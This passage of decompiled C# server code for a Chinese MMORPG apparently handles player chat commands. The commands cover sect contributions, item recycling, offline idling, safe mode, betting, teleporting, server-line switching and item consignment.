					系统提示("没有加入任何门派无法使用此命令!请加入门派后尝试!", 9, "系统提示");
					return true;
				}
				CheckTreasureGems();
				if (base.FLD_RXPIONT >= World.贡献元宝数)
				{
					检察元宝数据(World.贡献元宝数, 0, "贡献");
					SaveGemData();
					base.门派贡献度 += World.贡献元宝荣誉点;
					SavePlayerData();
					DataTable dataTable = RxjhClass.得到门派荣誉数据(base.帮派名字, base.人物分区ID);
					if (dataTable != null)
					{
						int num13 = (int)dataTable.Rows[0]["FLD_RY"];
						DataTable dataTable3 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable3 != null)
						{
							DataTable dataTable4 = RxjhClass.得到人物名字(dataTable3.Rows[0]["G_Master"].ToString());
							if (dataTable4 != null)
							{
								RxjhClass.更新门派荣誉(dataTable3.Rows[0]["G_Master"].ToString(), dataTable3.Rows[0]["G_Name"].ToString(), (int)dataTable4.Rows[0]["FLD_ZX"], (int)dataTable4.Rows[0]["FLD_LEVEL"], (int)dataTable4.Rows[0]["FLD_JOB"], (int)dataTable4.Rows[0]["FLD_JOB_LEVEL"], num13 + World.贡献元宝荣誉点, base.人物分区ID);
								系统提示("你为本门派获得 " + World.贡献元宝荣誉点 + "贡献点数", 9, "系统提示1");
								dataTable4.Dispose();
							}
							dataTable3.Dispose();
						}
						dataTable.Dispose();
					}
					else
					{
						DataTable dataTable5 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable5 != null)
						{
							if (dataTable5.Rows.Count > 0)
							{
								DataTable dataTable6 = RxjhClass.得到人物名字(dataTable5.Rows[0]["G_Master"].ToString());
								if (dataTable6 != null)
								{
									RxjhClass.创建门派荣誉(dataTable5.Rows[0]["G_Master"].ToString(), dataTable5.Rows[0]["G_Name"].ToString(), (int)dataTable6.Rows[0]["FLD_ZX"], (int)dataTable6.Rows[0]["FLD_LEVEL"], (int)dataTable6.Rows[0]["FLD_JOB"], (int)dataTable6.Rows[0]["FLD_JOB_LEVEL"], World.贡献元宝荣誉点, base.人物分区ID);
									系统提示("你为本门派获得 " + World.贡献元宝荣誉点 + "贡献点数", 9, "系统提示");
									dataTable6.Dispose();
								}
							}
							dataTable5.Dispose();
						}
					}
				}
				else
				{
					系统提示("元宝不足需要 " + World.贡献元宝数 + "元宝才可以贡献", 9, "系统提示");
				}
			}
			if (array.Length >= 1 && array[0] == World.贡献物品命令)
			{
				if (base.帮派Id == 0)
				{
					系统提示("没有加入任何门派无法使用此命令!请加入门派后尝试!", 9, "[系统]");
					return true;
				}
				long num33 = 装备栏包裹[0].Get物品ID;
				if (num33 == 0)
				{
					系统提示("请把要贡献的物品放到第一格", 9, "[系统]");
					return true;
				}
				if (装备栏包裹[0].物品绑定)
				{
					num33 -= 20000;
				}
				bool flag = false;
				foreach (ItemContributionData value9 in World.ItemContributionData.Values)
				{
					string[] array3 = value9.RequiredItem.Split(',');
					if (int.Parse(array3[0]) != num33 || 装备栏包裹[0].Get物品数量 < int.Parse(array3[1]))
					{
						continue;
					}
					flag = true;
					减去物品(0, int.Parse(array3[1]));
					if (value9.ContributionValue == 0)
					{
						break;
					}
					DataTable dataTable7 = RxjhClass.得到门派荣誉数据(base.帮派名字, base.人物分区ID);
					if (dataTable7 != null)
					{
						int num2 = (int)dataTable7.Rows[0]["FLD_RY"];
						DataTable dataTable8 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable8 != null)
						{
							DataTable dataTable9 = RxjhClass.得到人物名字(dataTable8.Rows[0]["G_Master"].ToString());
							if (dataTable9 != null)
							{
								RxjhClass.更新门派荣誉(dataTable8.Rows[0]["G_Master"].ToString(), dataTable8.Rows[0]["G_Name"].ToString(), (int)dataTable9.Rows[0]["FLD_ZX"], (int)dataTable9.Rows[0]["FLD_LEVEL"], (int)dataTable9.Rows[0]["FLD_JOB"], (int)dataTable9.Rows[0]["FLD_JOB_LEVEL"], num2 + value9.ContributionValue, base.人物分区ID);
								系统提示("你为本门派获得 " + value9.ContributionValue + "贡献点数", 9, "[系统]");
								dataTable9.Dispose();
							}
							dataTable8.Dispose();
						}
						dataTable7.Dispose();
					}
					else
					{
						DataTable dataTable10 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable10 != null)
						{
							if (dataTable10.Rows.Count > 0)
							{
								DataTable dataTable2 = RxjhClass.得到人物名字(dataTable10.Rows[0]["G_Master"].ToString());
								if (dataTable2 != null)
								{
									RxjhClass.创建门派荣誉(dataTable10.Rows[0]["G_Master"].ToString(), dataTable10.Rows[0]["G_Name"].ToString(), (int)dataTable2.Rows[0]["FLD_ZX"], (int)dataTable2.Rows[0]["FLD_LEVEL"], (int)dataTable2.Rows[0]["FLD_JOB"], (int)dataTable2.Rows[0]["FLD_JOB_LEVEL"], value9.ContributionValue, base.人物分区ID);
									系统提示("你为本门派获得 " + value9.ContributionValue + "贡献点数", 9, "[系统]");
									dataTable2.Dispose();
								}
							}
							dataTable10.Dispose();
						}
					}
					base.门派贡献度 += value9.ContributionValue;
					SavePlayerData();
					break;
				}
				if (!flag)
				{
					系统提示("您的物品不在贡献列表内！", 20, "贡献物品");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!回收物品")
			{
				long num24 = 装备栏包裹[0].Get物品ID;
				if (num24 == 0)
				{
					系统提示("请把要回收的物品放到第一格", 9, "[系统]");
					return true;
				}
				if (装备栏包裹[0].物品绑定)
				{
					num24 -= 20000;
				}
				bool flag2 = false;
				foreach (物品回收类 value2 in World.物品回收数据.Values)
				{
					string[] array4 = value2.需要物品.Split(',');
					if (int.Parse(array4[0]) == num24 && 装备栏包裹[0].Get物品数量 >= int.Parse(array4[1]))
					{
						flag2 = true;
						减去物品(0, 1);
						if (value2.元宝 != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
						{
							CheckTreasureGems();
							检察元宝数据(value2.元宝, 1, "命令回收");
							系统提示("恭喜你获得" + value2.元宝 + "个元宝！", 10, "回收物品");
							SaveGemData();
						}
						if (value2.钻石 != 0 && base.FLD_RXPIONTX != World.帐号总元宝上限)
						{
							CheckTreasureGems();
							CheckGemPointsData(value2.钻石, 1, "命令回收");
							系统提示("恭喜你获得" + value2.钻石 + "个钻石！", 10, "回收物品");
							SaveGemData();
						}
					}
				}
				if (!flag2)
				{
					系统提示("您的物品不在回收列表内！", 20, "回收物品");
				}
				return true;
			}
			if (array.Length >= 1 && text == "!清理热血符")
			{
				if (公有药品 != null)
				{
					if (公有药品.Count > 0)
					{
						using (IEnumerator<公有药品类> enumerator2 = 公有药品.Values.GetEnumerator())
						{
							if (enumerator2.MoveNext())
							{
								公有药品类 current2 = enumerator2.Current;
								清理符(current2.药品ID);
							}
						}
						系统提示("所有符类清理完成，小退重新上线生效。");
						退回到人物列表(null, 0);
					}
				}
				else
				{
					系统提示("没有可清理的符类。");
				}
				return true;
			}
			if (array.Length >= 1 && text == "!清理药品")
			{
				if (追加状态列表 != null)
				{
					foreach (追加状态类 value3 in 追加状态列表.Values)
					{
						if (value3.FLD_PID != 1008001043 && value3.FLD_PID != 1008001042)
						{
							value3.时间结束事件();
						}
					}
				}
				if (追加状态New列表 != null)
				{
					foreach (追加状态New类 value4 in 追加状态New列表.Values)
					{
						value4.时间结束事件();
					}
				}
				系统提示("药品清理成功。");
				return true;
			}
			if (array.Length >= 1 && text == "!卡号自救")
			{
				卡号自救();
				return true;
			}
			if (array.Length >= 1 && text == "!清理金币")
			{
				if (base.Player_Money > 0)
				{
					base.Player_Money = 0L;
				}
				更新金钱和负重();
				系统提示("清理金币成功。");
				return true;
			}
			if (array.Length >= 1 && array[0] == "!离婚")
			{
				base.FLD_情侣 = string.Empty;
				base.FLD_情侣_爱情度 = 0;
				是否已婚 = 0;
				婚戒刻字 = string.Empty;
				解除关系倒计时 = 0;
				武功新[2, 16] = null;
				武功新[2, 17] = null;
				bool flag3 = false;
				int 位置 = 0;
				for (int i = 0; i < 96; i++)
				{
					if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000415)
					{
						位置 = i;
						flag3 = true;
						break;
					}
				}
				if (flag3)
				{
					减去物品(位置, 1);
				}
				系统提示("离婚完成，请下线后再上", 9, "[系统提示]");
				return true;
			}
			if (array.Length >= 1 && text == "!离线挂机")
			{
				if (进店中)
				{
					系统提示("商店打开中不能使用离线挂机。", 50, "系统提示");
					return true;
				}
				if (交易 != null && 交易.交易中)
				{
					系统提示("交易中不能使用离线挂机。", 50, "系统提示");
					return true;
				}
				if (base.人物坐标_地图 != 101 && base.人物坐标_地图 != 1201)
				{
					系统提示("只有在泫勃派才能离线挂机。", 50, "系统提示");
					return true;
				}
				if (base.人物坐标_地图 == 101 && ((double)base.人物坐标_X < 80.0 || (double)base.人物坐标_X > 915.0 || (double)base.人物坐标_Y < 1320.0 || (double)base.人物坐标_Y > 2326.0))
				{
					系统提示("只有在新手城内才能离线挂机。", 50, "系统提示");
					return true;
				}
				if (World.允许挂机 == 0)
				{
					系统提示("本线不允许离线挂机。", 50, "系统提示");
					return true;
				}
				if (组队id != 0)
				{
					系统提示("组队中, 不允许离线挂机。", 50, "系统提示");
					return true;
				}
				if (组队id != 0 && World.Teams.TryGetValue(组队id, out var value10))
				{
					value10.退出(this, 0);
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (攻击器 != null)
				{
					攻击器.Close();
					攻击器.Dispose();
					攻击器 = null;
				}
				if (查坐标 != null)
				{
					查坐标.Close();
					查坐标.Dispose();
					查坐标 = null;
				}
				if (自动坐标 != null)
				{
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				if (攻击列表 != null)
				{
					攻击列表.Clear();
				}
				if (新武功连击 != null)
				{
					新武功连击.Clear();
				}
				if (玉连环 != null)
				{
					玉连环.Clear();
				}
				if (交易 != null)
				{
					交易 = null;
				}
				if (得到门徽ID != null)
				{
					得到门徽ID.Clear();
					得到门徽ID = null;
				}
				if (NpcList != null)
				{
					if (NpcList.Count > 0)
					{
						foreach (NpcClass value5 in NpcList.Values)
						{
							value5.PlayList_Remove(this);
						}
					}
					NpcList.Clear();
					NpcList = null;
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
					地面物品列表 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (异常状态 != null)
				{
					异常状态.Clear();
					异常状态 = null;
				}
				if (神女异常状态 != null)
				{
					神女异常状态.Clear();
					神女异常状态 = null;
				}
				World.OfflineCount++;
				World.conn.发送("离线挂机|" + base.Userid);
				保存人物数据存储过程();
				base.Client.Offline();
				return true;
			}
			if (array.Length >= 1 && array[0] == World.离线挂机打怪命令)
			{
				if (!进店中)
				{
					离线挂机打怪模式 = 1;
					自动挂机坐标X = (int)base.人物坐标_X;
					自动挂机坐标Y = (int)base.人物坐标_Y;
					自动挂机地图 = base.人物坐标_地图;
					离线挂机武功ID = 得到最高武功();
					if (交易 != null && 交易.交易中)
					{
						关闭交易(152, 0, 6);
					}
					SaveGemData();
					SavePlayerData();
					World.假人数量++;
					base.Client.离线挂机();
					MainForm.WriteLine(3, "玩家自动打怪坐标X :" + 自动挂机坐标X + " 挂机坐标Y :" + 自动挂机坐标Y);
					if (base.账号是否假人 != base.是否假人)
					{
						DBA.ExeSqlCommand($"UPDATE TBL_ACCOUNT SET 是否假人='{base.是否假人}' WHERE FLD_ID='{base.Userid}'", "rxjhaccount");
					}
					return true;
				}
				系统提示("请先退出商店才能开启智能挂!", 10, "提示");
				return true;
			}
			if (array.Length >= 1 && array[0] == "!云挂机")
			{
				if (云挂机模式 == 1)
				{
					if (!进店中)
					{
						离线挂机打怪模式 = 1;
						自动挂机坐标X = (int)base.人物坐标_X;
						自动挂机坐标Y = (int)base.人物坐标_Y;
						自动挂机地图 = base.人物坐标_地图;
						离线挂机武功ID = 得到最高武功();
						if (交易 != null && 交易.交易中)
						{
							关闭交易(152, 0, 6);
						}
						SaveGemData();
						SavePlayerData();
						World.假人数量++;
						World.CloudAfkCount++;
						base.Client.离线挂机();
						MainForm.WriteLine(1, "[" + base.UserName + "]进入云挂机:坐标X :" + 自动挂机坐标X + " 坐标Y :" + 自动挂机坐标Y);
						if (base.账号是否假人 != base.是否假人)
						{
							DBA.ExeSqlCommand($"UPDATE TBL_ACCOUNT SET 是否假人='{base.是否假人}' WHERE FLD_ID='{base.Userid}'", "rxjhaccount");
						}
						return true;
					}
					系统提示("请先退出商店才能开启云挂机!", 10, "提示");
					return true;
				}
				系统提示("百宝购买云挂机右键使用后, 才可以开启:!云挂机", 10, "提示");
				return true;
			}
			if (array.Length >= 1 && array[0] == World.离线挂机打架命令)
			{
				if (!进店中)
				{
					离线打架模式 = 1;
					自动挂机坐标X = (int)base.人物坐标_X;
					自动挂机坐标Y = (int)base.人物坐标_Y;
					自动挂机地图 = base.人物坐标_地图;
					离线打架武功ID = 得到最高武功();
					if (交易 != null && 交易.交易中)
					{
						关闭交易(152, 0, 6);
					}
					SaveGemData();
					SavePlayerData();
					World.假人数量++;
					base.Client.离线挂机();
					MainForm.WriteLine(3, "玩家自动打怪坐标X :" + 自动挂机坐标X + " 挂机坐标Y :" + 自动挂机坐标Y);
					if (base.账号是否假人 != base.是否假人)
					{
						DBA.ExeSqlCommand($"UPDATE TBL_ACCOUNT SET 是否假人='{base.是否假人}' WHERE FLD_ID='{base.Userid}'", "rxjhaccount");
					}
					return true;
				}
				系统提示("请先退出商店才能开启智能挂!", 10, "提示");
				return true;
			}
			if (array.Length >= 1 && text == "!进入安全模式" && World.是否开启安全模式 == 1)
			{
				if (GetAddState(1008001326))
				{
					新吃药提示();
					系统提示("你已经是安全模式无需重复开启。");
				}
				else if (DateTime.Now.Hour >= int.Parse(World.安全模式时间[0]) && DateTime.Now.Hour <= int.Parse(World.安全模式时间[1]))
				{
					CheckTreasureGems();
					if (base.FLD_RXPIONT >= World.安全模式消耗元宝)
					{
						检察元宝数据(World.安全模式消耗元宝, 0, "安全");
						int num28 = World.安全挂机时间 * 60000;
						追加状态类 追加状态类2 = new 追加状态类(this, num28, 1008001326, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						状态效果(BitConverter.GetBytes(1008001326), 1, num28);
						安全模式 = 1;
						系统提示("恭喜你, 安全模式开启成功, 请放心挂 机。");
						更新武功和状态();
						SaveGemData();
					}
					else
					{
						系统提示("元宝不足, 开启安全模式需要支付" + World.安全模式消耗元宝 + "元宝。");
					}
				}
				else
				{
					系统提示("安全模式开放时间为每天" + int.Parse(World.安全模式时间[0]) + "点到" + int.Parse(World.安全模式时间[1]) + "点!", 9, "系统提示");
				}
				return true;
			}
			if (array.Length >= 1 && text == "!退出安全模式")
			{
				if (追加状态列表 != null && GetAddState(1008001326))
				{
					追加状态列表[1008001326].时间结束事件();
				}
				安全模式 = 0;
				系统提示("安全模式已解除, 行走江湖要小心。");
				return true;
			}
			if (array.Length >= 1 && text == "!高级押注")
			{
				if (base.是否押注)
				{
					系统提示("不允许重复下注。");
					return true;
				}
				if (World.EVEPVP != null)
				{
					if (World.Eve90进程 == 1)
					{
						if (!World.evePlayers.TryGetValue(base.人物全服ID, out var _))
						{
							CheckTreasureGems();
							if (base.FLD_RXPIONT >= World.允许玩家押注数量)
							{
								if (array[1] == "单" || array[1] == "双")
								{
									base.是否押注 = true;
									base.押注专场代码 = 90;
									base.押注单双 = array[1];
									base.元宝账户状态 = true;
									系统提示("下注成功，下注数量为" + World.允许玩家押注数量 + "元宝。");
								}
								else
								{
									系统提示("指令错误, 正确的下注指令为[!高级押注 单] 或 [!高级押注 双]。");
								}
							}
							else
							{
								系统提示("元宝数低于" + World.允许玩家押注数量 + "不能下注。");
							}
						}
					}
					else
					{
						系统提示("下注时间已过，等待下一轮吧。");
					}
				}
				else
				{
					系统提示("高级竞技专场没有比赛在进行中，暂时不能下注。");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!签不能@到")
			{
				DateTime now = DateTime.Now;
				if (DateTime.Now > base.FLD_QDVIPTIM)
				{
					if (base.FLD_VIP == 1)
					{
						base.Player_WuXun += 5;
						CheckTreasureGems();
						检察元宝数据(5, 1, "签到");
						SaveGemData();
						更新武功和状态();
						系统提示("领取每日签到：5元宝");
						系统提示("领取每日签到：5武勋");
						DateTime dateTime2 = (base.FLD_QDVIPTIM = DateTime.Now.AddDays(1.0));
						now = dateTime2;
						保存会员签到数据();
					}
					else
					{
						系统提示("你还不是vip会员");
					}
				}
				else
				{
					系统提示("在[" + base.FLD_QDVIPTIM.ToString("yyyy年MM月dd日 HH时mm分ss秒") + "]后, 才能再次签到。");
				}
			}
			if (array.Length >= 1 && array[0] == World.首充命令)
			{
				领取充值奖励();
			}
			if (array.Length >= 1 && array[0] == World.福利命令)
			{
				CheckTreasureGems();
				if (base.FLD_Coin == 0)
				{
					if (base.Player_Job == 1 || base.Player_Job == 8)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 2 || base.Player_Job == 9)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 3 || base.Player_Job == 12)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 4 || base.Player_Job == 11)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 5 || base.Player_Job == 13)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 6)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 7)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					else if (base.Player_Job == 10)
					{
						AddItemWithProperties(1008000529, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						检察华夏币数据(1, 1);
					}
					SaveGemData();
				}
				else
				{
					系统提示("每个人一次机会领取, 不要重复领取谢谢..", 21, "新手福利");
				}
			}
			if (array.Length >= 1 && text == "!清理英雄职业武器")
			{
				清理英雄职业武器();
				return true;
			}
			if (array.Length >= 1 && text == "!领取2英2雄职1业武器")
			{
				领取英雄职业武器();
				return true;
			}
			if (array.Length >= 1 && text == "!清理背包")
			{
				if (安全码是否通过验证)
				{
					清理背包();
				}
				else
				{
					发送安全码消息(4);
				}
				return true;
			}
			if (array.Length >= 1 && text == "!清理绑定背包")
			{
				if (安全码是否通过验证)
				{
					清理绑定背包();
				}
				else
				{
					发送安全码消息(7);
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!清理行囊")
			{
				if (安全码是否通过验证)
				{
					清理行囊();
				}
				else
				{
					发送安全码消息(8);
				}
				return true;
			}
			if (array.Length >= 2 && text == "!移动")
			{
				if (打开仓库中 || base.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2341 || base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201 || base.人物_HP == 0)
				{
					return true;
				}
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return true;
				}
				if (array[1] == "银币广场" || 打开仓库中 || base.人物坐标_地图 == 2501)
				{
					return true;
				}
				if (base.Player_Money < 10000)
				{
					系统提示("游戏币不足1万, 不能完成移动。");
					return true;
				}
				bool flag4 = false;
				foreach (坐标Class item in World.移动)
				{
					if (!(item.Rxjh_name == array[1]))
					{
						continue;
					}
					string[] array5 = World.地图锁定.Split(';');
					if (array5.Length >= 1)
					{
						for (int j = 0; j < array5.Length; j++)
						{
							if (int.Parse(array5[j]) == item.Rxjh_Map)
							{
								return true;
							}
						}
					}
					if (item.Rxjh_Map == 801)
					{
						系统提示("势力战地图不能移动！", 9, "系统提示");
						return true;
					}
					if (item.Rxjh_Map == 41001)
					{
						系统提示("仙魔大战地图不能移动！", 9, "系统提示");
						return true;
					}
					if (item.Rxjh_Map == 42001)
					{
						系统提示("攻城战地图不能移动！", 9, "系统提示");
						return true;
					}
					if (item.Rxjh_Map == 9001)
					{
						if (World.华婚殿是否在使用中)
						{
							if (World.婚礼list.TryGetValue(9001, out var value11))
							{
								if (value11.婚礼进程 == 0)
								{
									移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
									flag4 = true;
									break;
								}
								系统提示("婚礼已经开始或已结束。");
								return true;
							}
							系统提示("此婚宴厅还没有婚礼举行。");
							return true;
						}
						系统提示("此婚宴厅没有婚礼举行。");
						return true;
					}
					if (item.Rxjh_Map == 9101)
					{
						if (World.龙赡殿是否在使用中)
						{
							if (World.婚礼list.TryGetValue(9101, out var value12))
							{
								if (value12.婚礼进程 == 0)
								{
									移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
									flag4 = true;
									break;
								}
								系统提示("婚礼已经开始或已结束。");
								return true;
							}
							系统提示("此婚宴厅还没有婚礼举行。");
							return true;
						}
						系统提示("此婚宴厅没有婚礼举行。");
						return true;
					}
					if (item.Rxjh_Map == 9201)
					{
						if (World.圣礼殿是否在使用中)
						{
							if (World.婚礼list.TryGetValue(9201, out var value13))
							{
								if (value13.婚礼进程 == 0)
								{
									移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
									flag4 = true;
									break;
								}
								系统提示("婚礼已经开始或已结束。");
								return true;
							}
							系统提示("此婚宴厅还没有婚礼举行。");
							return true;
						}
						系统提示("此婚宴厅没有婚礼举行。");
						return true;
					}
					if (item.Rxjh_Map == 5001 && base.Player_Level < int.Parse(World.地图限制等级[0]))
					{
						系统提示("北海冰宫地图[" + int.Parse(World.地图限制等级[0]) + "]级才能移动");
						return true;
					}
					if (item.Rxjh_Map == 6001 && base.Player_Level < int.Parse(World.地图限制等级[1]))
					{
						系统提示("南林地图[" + int.Parse(World.地图限制等级[1]) + "]级才能移动");
						return true;
					}
					if (item.Rxjh_Map == 25100 && base.Player_Level < int.Parse(World.地图限制等级[2]))
					{
						系统提示("虎峡谷地图[" + int.Parse(World.地图限制等级[2]) + "]级才能移动");
						return true;
					}
					if (item.Rxjh_Map == 26000 && base.Player_Level < int.Parse(World.地图限制等级[3]))
					{
						系统提示("花亭平原地图[" + int.Parse(World.地图限制等级[3]) + "]级才能移动");
						return true;
					}
					if (item.Rxjh_Map == 26100 && base.Player_Level < int.Parse(World.地图限制等级[4]))
					{
						系统提示("燕飞阁地图[" + int.Parse(World.地图限制等级[4]) + "]级才能移动");
						return true;
					}
					移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
					flag4 = true;
					break;
				}
				if (!flag4)
				{
					系统提示("移动错误，地图名不存在。");
				}
				else
				{
					base.Player_Money -= 10000L;
					更新金钱和负重();
				}
				return true;
			}
			if (array.Length >= 1 && text == "!送给自己鲜花")
			{
				if (base.Player_Zx == 0)
				{
					系统提示("人物必须二转以上才可以送花.");
					return true;
				}
				if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
				{
					系统提示("请把鲜花物品放到第一格", 9, "系统提示");
					return true;
				}
				if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != 1008001382 && BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != 1008001383 && BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != 1008001384 && BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != 1008001385)
				{
					系统提示("此命令仅对自己送花物品有用", 9, "系统提示");
					return true;
				}
				int num29 = 0;
				if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) == 1008001382)
				{
					num29 = 9;
				}
				else if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) == 1008001383)
				{
					num29 = 99;
				}
				else if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) == 1008001384)
				{
					num29 = 999;
				}
				else if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) == 1008001385)
				{
					num29 = 9999;
				}
				玫瑰称号积分 += num29;
				更新玫瑰排行(this, this, num29);
				减去物品(0, 1);
				获得玫瑰称号属性();
				系统提示("玫瑰数量增加" + num29 + "朵!", 10, "[系统提示]");
				World.发送玫瑰公告(base.UserName + " 送给自己[" + num29 + "]朵玫瑰, 达到一定数量可以获取相应的称号和BUFF!!!!");
			}
			if (array.Length >= 2 && array[0] == World.换线命令)
			{
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return true;
				}
				if (base.Player死亡 || 退出中 || (个人商店 != null && 个人商店.个人商店是否开启) || (交易 != null && 交易.交易人 != null))
				{
					系统提示("当前状态不能移动！", 10, "换线提示");
					return true;
				}
				int num30 = 0;
				if (array[1] == "1线" && World.打开换线线路1 == 1)
				{
					num30 = 1;
				}
				else if (array[1] == "2线" && World.打开换线线路2 == 1)
				{
					num30 = 2;
				}
				else if (array[1] == "3线" && World.打开换线线路3 == 1)
				{
					num30 = 3;
				}
				else if (array[1] == "4线" && World.打开换线线路4 == 1)
				{
					num30 = 4;
				}
				else if (array[1] == "5线" && World.打开换线线路5 == 1)
				{
					num30 = 5;
				}
				else if (array[1] == "6线" && World.打开换线线路6 == 1)
				{
					num30 = 6;
				}
				else if (array[1] == "7线" && World.打开换线线路7 == 1)
				{
					num30 = 7;
				}
				else if (array[1] == "8线" && World.打开换线线路8 == 1)
				{
					num30 = 8;
				}
				else if (array[1] == "9线" && World.打开换线线路9 == 1)
				{
					num30 = 9;
				}
				else if (array[1] == "10线" && World.打开换线线路10 == 1)
				{
					num30 = 10;
				}
				else if (array[1] == "11线" && World.打开换线线路11 == 1)
				{
					num30 = 11;
				}
				else if (array[1] == "12线" && World.打开换线线路12 == 1)
				{
					num30 = 12;
				}
				int num31 = num30 - 1;
				ServerList value14;
				if (num31 == base.原服务器序号)
				{
					系统提示("当前人物所在线路和要切换线路相同。", 10, "线路提示");
				}
				else if (SerList.TryGetValue(num31, out value14))
				{
					系统提示(array[1] + "线, 线路切换中，请稍等。。。", 10, "线路管理员");
					World.conn.发送("更新原服务器|" + base.Userid + "|" + num31 + "|" + value14.服务器IP + "|" + value14.服务器端口 + "|" + value14.服务器ID);
					换线(value14.服务器ID, value14.服务器IP, value14.服务器端口);
				}
				else
				{
					系统提示(array[1] + "线路尚未开放或禁止换线...", 10, "线路提示");
				}
				return true;
			}
			if (array.Length >= 2 && array[0] == "!寄售")
			{
				try
				{
					if (World.寄售系统是否开启 == 0)
					{
						系统提示("寄售系统尚未开放。", 20, "寄售提示");
						return true;
					}
					if (base.FLD_RXPIONT < 50)
					{
						系统提示("寄售需要手续费, 元宝不足50, 不能寄售！", 20, "系统提示");
						return true;
					}
					if (RxjhClass.得到寄售数量(base.Userid) >= 3)
					{
						系统提示("您账户下的寄存数量已经到最大数量！", 20, "寄售提示");
						return true;
					}
					if (int.Parse(array[1]) < 1)
					{
						系统提示("寄卖物品最低寄卖价格为1钻石", 9, "寄售提示");
						return true;
					}
					int 绑定 = 0;
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
					{
						系统提示("请把要寄卖的物品放到第一格", 9, "系统提示");
						return true;
					}
					if (装备栏包裹[0].锁定)
					{
						系统提示("寄卖错误, 请关闭商店交易等", 9, "系统提示");
						return true;
					}
					if (base.Player_Level < 35)
					{
						系统提示("人物达到35级后才能上架寄卖物品", 9, "系统提示");
						return true;
					}
					if (装备栏包裹[0].物品绑定)
					{
						绑定 = 1;
						if (World.是否可以寄售绑定装备 == 0)
						{
							系统提示("绑定物品不可以寄卖!", 9, "系统提示");
							return true;
						}
					}
					if (World.检查物品是否被锁定(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0)) || World.检查物品是否被锁定(BitConverter.ToInt32(装备栏包裹[0].物品全局ID, 0)))
					{
						系统提示("锁定物品不可以寄卖", 9, "系统提示");
						return true;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), out var value15))
					{
						系统提示("寄卖失败 数据错误", 9, "系统提示");
						return true;
					}
					if (value15.FLD_SIDE == 1)
					{
						系统提示("可叠加物品不可以寄卖", 9, "系统提示");
						return true;
					}
					寄存物品类 寄存物品类2 = new 寄存物品类();
					寄存物品类2.ID = 装备栏包裹[0].Get物品全局ID;
					寄存物品类2.PID = (int)装备栏包裹[0].Get物品ID;
					寄存物品类2.NAME = value15.ItmeNAME;
					寄存物品类2.PRICE = int.Parse(array[1]);
					寄存物品类2.MAGIC0 = 装备栏包裹[0].FLD_MAGIC0;
					寄存物品类2.MAGIC1 = 装备栏包裹[0].FLD_MAGIC1;
					寄存物品类2.MAGIC2 = 装备栏包裹[0].FLD_MAGIC2;
					寄存物品类2.MAGIC3 = 装备栏包裹[0].FLD_MAGIC3;
					寄存物品类2.MAGIC4 = 装备栏包裹[0].FLD_MAGIC4;
					寄存物品类2.初级附魂 = 装备栏包裹[0].FLD_FJ_觉醒;
